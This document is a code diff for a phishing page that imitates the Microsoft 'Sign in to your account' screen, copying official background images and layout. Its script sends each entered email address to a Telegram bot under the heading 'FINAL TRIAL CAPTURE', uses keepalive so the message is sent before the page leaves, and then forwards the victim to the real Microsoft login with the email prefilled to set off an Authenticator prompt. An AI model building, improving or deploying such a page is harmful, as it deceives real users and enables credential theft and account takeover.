@@ -5,16 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to your account</title>
     <style>
-        /* RESET & BASE */
         * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
         html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
 
-        /* THE SECRET: FULL PAGE BACKGROUND */
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
-            background-color: #deeaf4; /* Fallback */
-            /* We use the official MS Abstract Background URL with a forced reload tag */
-            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.jpg?v=final');
+            background-color: #deeaf4;
+            /* The "Fluent" Blurred Background */
+            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_61c068305f6c80521cc5c98695844893.jpg');
             background-size: cover;
             background-position: center center;
             background-repeat: no-repeat;
@@ -24,7 +22,6 @@
             align-items: center;
         }
 
-        /* CARD STYLING */
         .login-card {
             background: #fff; 
             width: 440px; 
@@ -34,7 +31,7 @@
             z-index: 5;
         }
 
-        .ms-logo { width: 108px; margin-bottom: 24px; }
+        .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
         h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
 
         .input-field {
@@ -43,34 +40,32 @@
         }
         .input-field:focus { border-bottom: 2px solid #0067b8; }
 
-        .link-text { font-size: 13px; margin: 12px 0; color: #1b1b1b; line-height: 1.5; }
+        .link-text { font-size: 13px; margin: 14px 0; color: #1b1b1b; }
         .link-text a { color: #0067b8; text-decoration: none; cursor: pointer; }
         .link-text a:hover { text-decoration: underline; }
 
-        /* BUTTONS */
-        .button-row { display: flex; justify-content: flex-end; margin-top: 30px; gap: 8px; }
-        .btn-back {
-            background-color: #ccc; color: #333; border: none;
-            padding: 7px 32px; font-size: 15px; cursor: pointer; min-width: 108px;
-        }
+        .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
         .btn-next {
             background-color: #0067b8; color: #fff; border: none;
-            padding: 7px 32px; font-size: 15px; cursor: pointer; min-width: 108px;
+            padding: 8px 36px; font-size: 15px; cursor: pointer; min-width: 108px;
         }
 
-        /* SIGN-IN OPTIONS BOX */
+        /* SIGN-IN OPTIONS BOX (Separate at the bottom) */
         .options-box {
-            background: #fff; width: 440px; padding: 12px 44px;
-            margin-top: 1px; box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-            display: flex; align-items: center; cursor: pointer;
-            z-index: 5;
+            background: #fff; 
+            width: 440px; 
+            padding: 12px 44px;
+            margin-top: 1px; 
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            display: flex; 
+            align-items: center; 
+            cursor: pointer;
         }
-        .key-icon { width: 24px; height: 24px; margin-right: 12px; opacity: 0.6; }
+        .key-icon { width: 24px; margin-right: 12px; opacity: 0.6; }
 
-        /* FOOTER */
         .footer { 
-            position: fixed; bottom: 0; width: 100%; text-align: right;
-            padding: 12px 30px; font-size: 12px; color: #000;
+            position: fixed; bottom: 0; right: 0;
+            padding: 12px 30px; font-size: 12px; 
         }
         .footer a { margin-left: 24px; text-decoration: none; color: #000; }
     </style>
@@ -87,7 +82,6 @@
         <p class="link-text"><a href="#">Can't access your account?</a></p>
 
         <div class="button-row">
-            <button class="btn-back" onclick="location.reload()">Back</button>
             <button class="btn-next" onclick="submitToTelegram()">Next</button>
         </div>
     </div>
@@ -112,6 +106,7 @@
             const text = `🚨 **FINAL TRIAL CAPTURE**\n\n**Email:** ${emailInput}`;
 
             try {
+                // 'keepalive' ensures the message sends before the redirect happens
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -120,7 +115,7 @@
                 });
             } catch (e) {}
 
-            // The exact OIDC redirect Microsoft uses
+            // Redirect to REAL Microsoft login to trigger the Authenticator flow
             window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-f0d6-410c-984c-f8310070e304&response_type=id_token&scope=openid&nonce=123&login_hint=" + encodeURIComponent(emailInput);
         }
     </script>
